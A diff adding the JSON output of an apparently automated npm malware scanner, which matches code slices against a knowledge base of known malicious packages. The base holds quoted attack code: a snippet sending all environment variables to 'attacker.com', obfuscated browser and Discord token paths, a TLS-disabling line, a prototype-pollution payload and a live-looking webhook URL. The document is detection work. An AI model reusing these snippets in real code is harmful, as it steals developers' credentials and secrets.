+              "match_id": "20250102_111622_786240_snippet_1",
+              "source_package": "alexbirsantest (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786240/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4443380534648895,
+              "code_similarity": 0.3540434241294861,
+              "behavior_similarity": 0.534632682800293,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Proof-of-concept code (from previous dependency confusion packages)\nconst https = require('https');\nconst data = process.env;\nhttps.request({\n  hostname: 'attacker.com',\n  path: '/collect',\n  method: 'POST',\n}, req => req.end(JSON.stringify(data)));\n",
+                "code_behavior": "At import-time, the code accesses all environment variables using process.env, serializes them, and sends the data via HTTPS POST to an attacker-controlled domain, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically collects all environment variables and transmits them to an external, attacker-controlled server without user knowledge or consent, which is a clear exfiltration technique.",
+                  "violated_expectations": "Legitimate SDK packages should never access or transmit full environment variables, especially to non-vendor domains, during import or installation. Such behavior is a severe violation of user trust and security best practices.",
+                  "similar_legitimate_use": "Some telemetry or crash reporting libraries may send limited, anonymized diagnostic data to official vendor servers, but they do not transmit full environment variables or secrets, nor do they send data to untrusted third-party domains.",
+                  "key_indicators": [
+                    "Access to process.env to read all environment variables",
+                    "Outbound HTTPS POST request to a non-Microsoft, attacker-controlled domain",
+                    "Automatic execution of network exfiltration code at import-time",
+                    "Presence of hardcoded external domain in main entry file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "alexbirsantest",
+                  "package_manager": "npm",
+                  "package_versions": "2100.4.2",
+                  "why_malicious": "The package exploited a process flaw by adding the 'azure-sdk' account as a collaborator, causing automated bots to list it as an official Azure SDK release. This allowed the attacker to distribute malicious code under the guise of a trusted vendor, enabling highly effective supply chain attacks by exfiltrating sensitive environment variables from victim systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes a package named similarly to official Azure SDK packages and adds the 'azure-sdk' account as a collaborator.",
+                    "implemented_by": [],
+                    "leads_to": "The package is automatically picked up and listed as an official Azure SDK release by automated bots."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Azure SDK release bot includes the package in the official releases CSV, making it appear trusted to developers.",
+                    "implemented_by": [],
+                    "leads_to": "Developers may trust and install the package, believing it is an official release."
+                  },
+                  {
+                    "step": 3,
+                    "action": "When the package is installed or imported, the malicious code in index.js executes and exfiltrates environment variables to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains access to sensitive credentials and secrets from victim systems, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm packages that access process.env and transmit data to external, non-vendor domains",
+                    "Packages that initiate outbound network requests at import-time or install-time",
+                    "Packages with collaborator lists including high-profile or vendor accounts (e.g., 'azure-sdk') without official provenance"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry file containing code that reads process.env and performs network requests",
+                    "Presence of hardcoded external domains not associated with Microsoft or Azure in source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with Microsoft or Azure (e.g., attacker.com)",
+                    "Unusual data exfiltration patterns involving environment variables during package installation or import"
+                  ],
+                  "how_to_detect": "Use static analysis to scan npm packages for code that accesses process.env and initiates outbound network connections, especially in index.js or main entry points. Monitor for packages that add high-profile vendor accounts as collaborators without official verification. Flag any package that transmits environment variables or sensitive data to non-vendor domains during install or import."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455833_snippet_2",
+              "source_package": "PuTTY (weaponized variant), RealVNC (weaponized variant), coa, rc, ua-parser-js (Direct distribution (executables), npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455833/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44388407468795776,
+              "code_similarity": 0.3318140208721161,
+              "behavior_similarity": 0.5559541583061218,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "[Obfuscated JavaScript code in the entrypoint of hijacked npm packages, not shown in report. The code reads process.env for variables like NPM_TOKEN, AWS_ACCESS_KEY_ID, and sends them via HTTP POST to attacker-controlled domains.]",
+                "code_behavior": "At import-time or runtime, the code reads sensitive environment variables such as NPM_TOKEN, AWS_ACCESS_KEY_ID, and AWS_SECRET_ACCESS_KEY, then sends their values via HTTP POST requests to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Legitimate npm packages do not access and exfiltrate environment variables containing credentials to external servers. The presence of obfuscated code in the entrypoint and network requests to untrusted domains is highly suspicious.",
+                  "violated_expectations": "Normal behavior is to provide utility functions as described in documentation, without accessing or transmitting sensitive environment variables. The malicious code exfiltrates secrets, violating user trust and package intent.",
+                  "similar_legitimate_use": "Some packages may collect telemetry or crash reports with user consent, but never transmit authentication tokens or cloud credentials.",
+                  "key_indicators": [
+                    "Obfuscated or minified code in package entrypoint (index.js)",
+                    "Network requests to hardcoded, untrusted domains during install or import",
+                    "Access to environment variables unrelated to package functionality",
+                    "HTTP POST payloads containing credential-like data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (npm package installation or use)",
+                  "file_location": "index.js or main entrypoint of hijacked npm packages (coa@2.0.3, 2.0.4, 2.1.1; rc@1.2.9; ua-parser-js@0.7.29, 0.8.0, 1.0.0)",
+                  "required_permissions": [
+                    "network (outbound HTTP/S requests)",
+                    "filesystem (read access to environment and config files)",
+                    "environment_vars (read sensitive environment variables)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "PuTTY (weaponized variant), RealVNC (weaponized variant), coa, rc, ua-parser-js",
+                  "package_manager": "Direct distribution (executables), npm",
+                  "package_versions": "Unknown for PuTTY/RealVNC; coa: 2.0.3, 2.0.4, 2.1.1; rc: 1.2.9; ua-parser-js: 0.7.29, 0.8.0, 1.0.0",
+                  "why_malicious": "These packages and executables were modified by threat actors to include malicious code that, when executed, establishes persistence, enables unauthorized remote access, and facilitates further malware deployment or data exfiltration. Attackers exploited the trust in widely used open source tools and npm packages to distribute malware at scale, targeting both end users and development environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is socially engineered to download and execute a modified open source tool (e.g., PuTTY/RealVNC) or install a hijacked npm package (coa, rc, ua-parser-js) from npm.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Initial compromise of the victim's machine or development environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code establishes persistence (via service installation) and/or exfiltrates sensitive data (credentials, environment variables) to attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains remote access or obtains sensitive information for further exploitation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses established access or stolen credentials to move laterally, deploy additional malware, or target secondary victims within the network or supply chain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Broader network compromise, data infiltration, and potential supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unexpected installation of persistent services or processes by PuTTY or RealVNC executables",
+                    "Outbound network connections from PuTTY, RealVNC, or npm package processes to untrusted or attacker-controlled domains/IPs",
+                    "Access and exfiltration of environment variables or credential files by npm package entrypoints",
+                    "Presence of obfuscated or minified code in npm package entrypoints (index.js)"
+                  ],
+                  "file_indicators": [
+                    "Modified PuTTY or RealVNC executables with non-standard hashes (not matching official releases)",
+                    "Obfuscated or minified JavaScript in index.js of coa@2.0.3, 2.0.4, 2.1.1; rc@1.2.9; ua-parser-js@0.7.29, 0.8.0, 1.0.0",
+                    "Creation of new Windows service or executable in system directories after running PuTTY/RealVNC"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP POST requests from npm package processes to attacker-controlled domains (as listed in the report, e.g., 'api[.]examplemalicious[.]com')",
+                    "Outbound connections from PuTTY/RealVNC processes to IPs/domains not associated with official tool infrastructure"
+                  ],
+                  "how_to_detect": "Monitor for new persistent services or executables created by PuTTY or RealVNC processes. Use file integrity monitoring to detect modified binaries with hashes differing from official releases. Scan npm package entrypoints for obfuscated or minified code and monitor for network requests to untrusted domains during or after package installation. Alert on access to sensitive environment variables or credential files by non-privileged or unexpected processes. Correlate outbound network activity with known attacker infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_892794_snippet_3",
+              "source_package": "ca-bucky-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_892794/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4359818398952484,
+              "code_similarity": 0.43883490562438965,
+              "behavior_similarity": 0.4331287741661072,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var props = process.env || {};",
+                "code_behavior": "During installation, the code accesses all environment variables from the host system, collecting potentially sensitive information such as credentials and configuration data.",
+                "malice_analysis": {
+                  "why_suspicious": "Bulk harvesting of environment variables is a common technique for credential theft, as these variables often contain secrets like API keys and tokens.",
+                  "violated_expectations": "Legitimate packages do not indiscriminately collect all environment variables, especially during installation.",
+                  "similar_legitimate_use": "Some build tools may access specific environment variables for configuration, but never in bulk or for exfiltration.",
+                  "key_indicators": [
+                    "Bulk access to process.env",
+                    "No filtering or legitimate use of environment data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via xmlhttprequest.js)",
+                  "file_location": "xmlhttprequest.js",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ca-bucky-client",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.2 and later (0.0.1 is not malicious)",
+                  "why_malicious": "The package is malicious because, during installation, it executes obfuscated JavaScript code that harvests all environment variables and system information, performs anti-analysis checks to evade detection, encodes the stolen data using a custom base64 variant, and exfiltrates it to a remote server controlled by the attacker. This behavior can result in the theft of sensitive credentials, such as AWS keys, and is designed to bypass both automated and manual analysis."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script executes bucky.js, which loads the malicious xmlhttprequest.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution in xmlhttprequest.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "xmlhttprequest.js collects all environment variables from the host system.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System and credential data harvested"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Performs anti-analysis checks to avoid sandboxes, certain usernames, and specific NPM registries.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Conditional execution or early exit"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Encodes the collected data using a custom base64 function to evade detection.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Obfuscated data ready for exfiltration"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Dynamically constructs the HTTP request method name to further obfuscate network activity.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Network exfiltration step"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Sends the obfuscated environment data to a remote server controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall script execution of local JavaScript files during npm install",
+                    "Bulk access to process.env during installation",
+                    "Outbound network requests to external servers during install phase",
+                    "Obfuscated or dynamically constructed method names in network code",
+                    "Anti-analysis checks for usernames, registry mirrors, or analysis environments"
+                  ],
+                  "file_indicators": [
+                    "Presence of xmlhttprequest.js in package root directory",
+                    "package.json with preinstall script referencing bucky.js",
+                    "require statements for local xmlhttprequest.js in bucky.js"
+                  ],
+                  "network_indicators": [
+                    "Requests to *.wixsite.com/*/_functions/*",
+                    "Outbound HTTP(S) requests initiated during npm install",
+                    "Encoded (base64 with inserted string) payloads in HTTP request bodies"
+                  ],
+                  "how_to_detect": "Monitor npm packages for preinstall scripts that execute local files, especially those that access process.env or initiate outbound network requests. Flag packages containing xmlhttprequest.js not present in the legitimate upstream. Detect obfuscated code that dynamically constructs method names or encodes data with non-standard base64 (e.g., with inserted strings). Alert on network traffic to known exfiltration endpoints such as wixsite.com/_functions/ during package installation."
+                }
+              }
+            }
+          ]
+        },
+        {
+          "slice_id": "props_slice_2",
+          "code_snippet": "const t = { settings: { services: { acl: \"test\" } }};\n\nconst { settings: { services: { acl } } } = t;\nconsole.log(acl);\n\n// ES11 - works, but throws eslint error (must set ecmaVersion: 2020, what is not possible in this bracket version)\nconst result = t?.settings?.services?.acl ?? \"default\";\nconsole.log(result);\n\nconst { settings: { services: { acl: x = \"default\" } } } = t;\nconsole.log(x);\nconst { settings: { services: { acl: y = \"default\" } } } = t;\nconsole.log(y);",
+          "is_malicious": false,
+          "malice_score": 0.4367235620816549,
+          "confidence": 0.1,
+          "behavior_summary": "At import-time, the code accesses nested configuration data containing the string \"test\" under settings.services.acl using destructuring and optional chaining, then logs these values. This behavior reads configuration data but does not perform any sensitive operations or network/file/process activities.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code snippet only performs safe, straightforward operations: it reads nested configuration data using destructuring and optional chaining, then logs the values. There are no indications of obfuscation, network communication, file system access, environment variable harvesting, or any other suspicious or malicious behavior. Compared to the known malicious patterns, this code lacks any sensitive API usage or intent to exfiltrate data or manipulate the system. The closest similarity is very low (around 0.44-0.45) and relates to either non-functional code or explicit malicious exfiltration, neither of which matches this snippet. Therefore, the code is benign.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_785146_snippet_1",
+              "source_package": "- (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_785146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4453122615814209,
+              "code_similarity": 0.39782005548477173,
+              "behavior_similarity": 0.49280446767807007,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.default = null;",
+                "code_behavior": "At import-time, the code defines the module as an ES module and exports a null default value, resulting in no data processing or side effects.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is not inherently malicious, but the presence of a package with a single-character name and no functional code is highly unusual. Such packages are often created unintentionally due to typographical errors and can be abused in the future if the code is updated to include malicious payloads.",
+                  "violated_expectations": "Legitimate npm packages typically provide useful functionality or utilities, whereas this package exports only a null value and performs no operations.",
+                  "similar_legitimate_use": "Test, placeholder, or namespace-reserving packages may sometimes be published with minimal or no functionality, but these are usually clearly marked or not widely downloaded.",
+                  "key_indicators": [
+                    "Single-character package name ('-')",
+                    "index.js exports only null as default",
+                    "No functional code or logic present",
+                    "Unusually high download count for a non-functional package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "-",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.1",
+                  "why_malicious": "The package '-' is not currently malicious, but its existence and high download count are due to accidental installations caused by typographical errors in npm commands. Its presence in projects is unintentional and could be abused in the future if the package contents change to include malicious code. The risk is that such packages can be silently included in builds, creating a potential supply chain attack vector by providing an opportunity for attackers to later introduce malicious payloads into a widely distributed, trusted dependency."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Accidental installation of the '-' package due to typographical errors in npm commands or package.json dependencies.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "The package is included in the project, potentially as a placeholder for future malicious code, creating a supply chain risk if the package contents are updated with malicious payloads."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of single-character or command-like package names in dependencies (e.g., '-', 'i', 'g', 'D')",
+                    "Packages with no functional code or only skeleton code (e.g., exporting null or empty modules)",
+                    "High download counts for packages with no legitimate usage or documentation"
+                  ],
+                  "file_indicators": [
+                    "package.json dependencies including '-', 'i', 'g', 'D', or other single-character/command-like names",
+                    "index.js file that only exports null or an empty module",
+                    "package.json scripts section with non-functional or placeholder scripts referencing missing files"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Scan package.json and package-lock.json for dependencies with suspicious names such as '-', 'i', 'g', or names matching npm command flags. Flag packages that have no functional code or only export null/empty modules in their main files. Check for non-functional npm scripts referencing missing files. Monitor for sudden inclusion of such packages in projects, especially if not explicitly added by developers, and alert on high download counts for packages with no legitimate usage or documentation."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456673_snippet_1",
+              "source_package": "fallguys (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456673/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43565666675567627,
+              "code_similarity": 0.330785870552063,
+              "behavior_similarity": 0.5405274629592896,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const _0x13e5 = ['post', 'exec', 'https://cdn.discordapp.com/avatars/', '/AppData/Local/Google/Chrome/User\\x20Data/Default/Local\\x20Storage/leveldb', '/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb', '/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb', '/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb', '/AppData/Roaming/discord/Local Storage/leveldb', ...];",
+                "code_behavior": "At import-time, the code defines an obfuscated array containing hardcoded file paths to browser and Discord local storage databases, loads these strings into memory, and prepares them for subsequent automated access, enabling targeted data harvesting.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of obfuscated arrays to store file paths to browser and Discord storage locations is a strong indicator of credential and session theft malware, as it conceals the intent to access sensitive data.",
+                  "violated_expectations": "A legitimate package would not obfuscate or enumerate browser or Discord local storage file paths, nor would it require access to these locations without explicit user action and transparency.",
+                  "similar_legitimate_use": "Security auditing or backup tools may enumerate such files, but they do so transparently, with user consent, and without obfuscation.",
+                  "key_indicators": [
+                    "Obfuscated array of browser and Discord storage file paths",
+                    "Hardcoded references to leveldb directories for multiple browsers and Discord",
+                    "Preparation for automated file access at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "fallguys",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.6",
+                  "why_malicious": "The package 'fallguys' impersonates a legitimate API for the Fall Guys game but contains heavily obfuscated JavaScript code that, upon import, systematically locates, reads, and exfiltrates sensitive browser and Discord application data to a hardcoded Discord webhook. The package provides no legitimate functionality and is solely designed for credential and session theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated file paths and sensitive strings are loaded into memory at import-time.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Automated enumeration of sensitive files"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive browser and Discord storage files are read from disk using filesystem APIs.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Data harvesting and preparation for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvested data and user profile metadata are formatted into a JSON payload for webhook delivery.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Payload is sent to the attacker's Discord webhook endpoint via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Completion of data theft and attacker access to stolen credentials"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated arrays containing hardcoded browser and Discord storage file paths in JavaScript code",
+                    "Automated reading of browser and Discord local storage files at import-time without user interaction",
+                    "Network requests to Discord webhook endpoints with harvested sensitive data at import-time"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated arrays of file paths referencing leveldb directories",
+                    "Access to /AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb and similar paths by non-browser processes",
+                    "References to Discord and multiple Chromium-based browser storage locations in package code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to discordapp.com/api/webhooks/746189410042904617/RQVJEOhzAblK5FlkQ-WIXkWfKfg5BFCdsjTeVueAIrVLaQMTvHgbuhuqFafPZYHfwnEq",
+                    "Outbound connections to Discord webhook endpoints from npm package processes"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that, at import-time, access browser or Discord local storage files and send their contents to external webhooks, especially Discord API endpoints. Flag any code that contains obfuscated arrays of sensitive file paths or constructs network requests to hardcoded webhook URLs. Alert on npm packages that read browser or IM storage files without user interaction and initiate outbound network connections to Discord webhook domains. Correlate filesystem access to leveldb directories with network activity to Discord webhooks for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_786240_snippet_1",
+              "source_package": "alexbirsantest (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786240/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43366971611976624,
+              "code_similarity": 0.2936130166053772,
+              "behavior_similarity": 0.5737264156341553,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Proof-of-concept code (from previous dependency confusion packages)\nconst https = require('https');\nconst data = process.env;\nhttps.request({\n  hostname: 'attacker.com',\n  path: '/collect',\n  method: 'POST',\n}, req => req.end(JSON.stringify(data)));\n",
+                "code_behavior": "At import-time, the code accesses all environment variables using process.env, serializes them, and sends the data via HTTPS POST to an attacker-controlled domain, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically collects all environment variables and transmits them to an external, attacker-controlled server without user knowledge or consent, which is a clear exfiltration technique.",
+                  "violated_expectations": "Legitimate SDK packages should never access or transmit full environment variables, especially to non-vendor domains, during import or installation. Such behavior is a severe violation of user trust and security best practices.",
+                  "similar_legitimate_use": "Some telemetry or crash reporting libraries may send limited, anonymized diagnostic data to official vendor servers, but they do not transmit full environment variables or secrets, nor do they send data to untrusted third-party domains.",
+                  "key_indicators": [
+                    "Access to process.env to read all environment variables",
+                    "Outbound HTTPS POST request to a non-Microsoft, attacker-controlled domain",
+                    "Automatic execution of network exfiltration code at import-time",
+                    "Presence of hardcoded external domain in main entry file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "alexbirsantest",
+                  "package_manager": "npm",
+                  "package_versions": "2100.4.2",
+                  "why_malicious": "The package exploited a process flaw by adding the 'azure-sdk' account as a collaborator, causing automated bots to list it as an official Azure SDK release. This allowed the attacker to distribute malicious code under the guise of a trusted vendor, enabling highly effective supply chain attacks by exfiltrating sensitive environment variables from victim systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes a package named similarly to official Azure SDK packages and adds the 'azure-sdk' account as a collaborator.",
+                    "implemented_by": [],
+                    "leads_to": "The package is automatically picked up and listed as an official Azure SDK release by automated bots."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Azure SDK release bot includes the package in the official releases CSV, making it appear trusted to developers.",
+                    "implemented_by": [],
+                    "leads_to": "Developers may trust and install the package, believing it is an official release."
+                  },
+                  {
+                    "step": 3,
+                    "action": "When the package is installed or imported, the malicious code in index.js executes and exfiltrates environment variables to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains access to sensitive credentials and secrets from victim systems, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm packages that access process.env and transmit data to external, non-vendor domains",
+                    "Packages that initiate outbound network requests at import-time or install-time",
+                    "Packages with collaborator lists including high-profile or vendor accounts (e.g., 'azure-sdk') without official provenance"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry file containing code that reads process.env and performs network requests",
+                    "Presence of hardcoded external domains not associated with Microsoft or Azure in source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with Microsoft or Azure (e.g., attacker.com)",
+                    "Unusual data exfiltration patterns involving environment variables during package installation or import"
+                  ],
+                  "how_to_detect": "Use static analysis to scan npm packages for code that accesses process.env and initiates outbound network connections, especially in index.js or main entry points. Monitor for packages that add high-profile vendor accounts as collaborators without official verification. Flag any package that transmits environment variables or sensitive data to non-vendor domains during install or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_853073_snippet_3",
+              "source_package": "Unknown (Lazarus APT npm package) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_853073/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.428152471780777,
+              "code_similarity": 0.32838815450668335,
+              "behavior_similarity": 0.5279167890548706,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';",
+                "code_behavior": "At import-time, the code sets the NODE_TLS_REJECT_UNAUTHORIZED environment variable to '0', globally disabling TLS certificate validation for all subsequent HTTPS requests, resulting in the ability to communicate with servers using invalid, self-signed, or malicious certificates and exposing the system to man-in-the-middle attacks.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling TLS certificate validation is a well-known anti-security technique that exposes all HTTPS communications to interception, tampering, and redirection to malicious servers.",
+                  "violated_expectations": "Secure applications are expected to validate TLS certificates to ensure the authenticity and integrity of communications; global overrides of this behavior are never appropriate in production code.",
+                  "similar_legitimate_use": "In rare cases, developers may disable TLS validation for local testing or debugging, but this should never occur in production code or without explicit user action.",
+                  "key_indicators": [
+                    "Global override of TLS certificate validation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED to '0'",
+                    "Facilitates insecure and potentially malicious network activity"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of npm package)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (Lazarus APT npm package)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (targeted packages in Lazarus APT repo)",
+                  "why_malicious": "The package acts as a first-stage loader in a two-stage malware attack. Upon import, it initiates a network request to a remote attacker-controlled server to retrieve a token, which is then used to fetch and execute a second-stage malicious script. The code disables TLS certificate validation globally, allowing insecure communications and facilitating further malicious activity such as exfiltration or command-and-control. The package is distributed via social engineering, specifically targeting developers in high-value sectors."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim installs or imports the malicious npm package, triggering the first-stage loader.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Fetching a token from the attacker's remote server."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The package uses the token to fetch and execute a second-stage malicious script.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of arbitrary attacker-controlled code."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package disables TLS certificate validation, allowing further malicious network activity.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Potential exfiltration, C2 communication, or further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package initiating unsolicited network requests to external domains at import-time",
+                    "Fetching and executing remote code using eval during package import",
+                    "Global disabling of TLS certificate validation via NODE_TLS_REJECT_UNAUTHORIZED"
+                  ],
+                  "file_indicators": [
+                    "index.js containing fetch calls to hardcoded external domains",
+                    "Presence of process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0'; in package code"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to malicious-remote-server.com or other attacker-controlled domains",
+                    "Unusual HTTP/HTTPS requests initiated during package import or installation"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that perform network requests or fetch remote code during import or installation. Flag any code that disables TLS certificate validation globally. Use static and dynamic analysis to detect the use of eval on remote content, and review logs for unexpected outbound connections to untrusted domains. Correlate these behaviors to identify multi-stage loader activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205359_429073_snippet_1",
+              "source_package": "jquery (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205359_429073/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42435136437416077,
+              "code_similarity": 0.42533308267593384,
+              "behavior_similarity": 0.4233696460723877,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "let a = $.extend(true, {}, JSON.parse('{\"__proto__\": {\"devMode\": true}}'));\nconsole.log({}.devMode); // true",
+                "code_behavior": "At runtime, the code performs a deep merge using jQuery.extend(true, ...) with user-controlled input containing a __proto__ property, resulting in the devMode property being set on Object.prototype and making it globally accessible.",
+                "malice_analysis": {
+                  "why_suspicious": "The code allows user input to modify the Object prototype, which can introduce attacker-controlled properties globally and compromise application logic or security boundaries.",
